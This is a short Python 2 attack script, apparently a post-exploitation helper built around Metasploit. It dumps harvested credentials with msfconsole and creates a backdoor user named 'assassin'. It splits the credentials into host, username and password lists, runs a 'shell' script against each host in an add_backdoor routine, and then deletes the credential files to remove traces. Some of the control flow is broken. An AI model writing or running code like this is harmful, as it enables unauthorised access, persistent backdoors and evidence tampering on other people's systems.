#! /usr/bin/python

import sys
import os
import crypt
import time
import platform
import subprocess
import glob
from Crypto.PublicKey import RSA


def keygen():
    key = RSA.generate(1024)
    f = open("key", "wb")
    f.write(key.exportKey('PEM'))
    f.close()

    pubkey = key.publickey()
    f = open("key.pub", "wb")
    f.write(pubkey.exportKey('OpenSSH'))
    f.close()
    sys.exit()


def prep():
    # save creds output to a file for grep & shit
    print "hmmm... let see how many passwords we have got ......\n"
    os.system("msfconsole -q -r db")  # just create the creds output
    # create new user (e.g., assassin)
    print "create new user (assassin) \n"
    os.system("bash -c 'source shell; test'")
    sys.exit()


def process():
    os.system("grep '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' \
    creds | awk '{ print $1, $5, $6 }' > 1.txt;\
    awk '{ print $1 }' 1.txt > hosts.txt;\
    awk '{ print $2 }' 1.txt > user.txt;\
    awk '{ print $3 }' 1.txt > password.txt;")
    sys.exit()


def clean():
    time.sleep(2)
    paper = "creds"
    if os.path.exists(paper):
        os.remove(paper)
        # second round
        for hgx in glob.glob("*.txt"):
            os.remove(hgx)
            sys.exit()


def add_backdoor():
    plat = platform.system()
    scriptDir = sys.path[0]
    hosts = os.path.join(scriptDir, 'hosts.txt')
    hostsFile = open(hosts, "r")
    lines = hostsFile.readlines()
    for line in lines:
        line = line.strip( )
        if plat == "Windows":
            args = ["cat >/dev/null", line]
            pass
        elif plat == "Linux":
            args = ["./shell"]
            power = subprocess.Popen(
            args,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE
            )
            out, error = power.communicate()
            print out
            print error
            hostsFile.close()
            sys.exit()

__all__ = ['prep', 'add_backdoor', 'clean']
